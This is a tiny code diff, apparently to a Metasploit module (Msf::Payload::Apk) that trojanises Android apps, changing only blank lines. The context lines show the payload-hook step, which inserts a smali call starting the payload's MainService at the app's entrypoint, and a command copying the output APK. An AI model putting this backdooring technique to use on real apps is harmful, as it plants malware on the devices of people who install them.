@@ -229,6 +229,7 @@ class Msf::Payload::Apk
     end
 
     payloadhook = %Q^invoke-static {}, L#{package_slash}/#{classes['MainService']};->start()V
+    
     ^ + entrypoint
     hookedsmali = hooksmali.sub(entrypoint, payloadhook)
 
@@ -258,5 +259,4 @@ run_cmd("cp #{tempdir}/output.apk $HOME/Tmux-Bunch/unsign")
     #outputapk
   end
 end
-
 
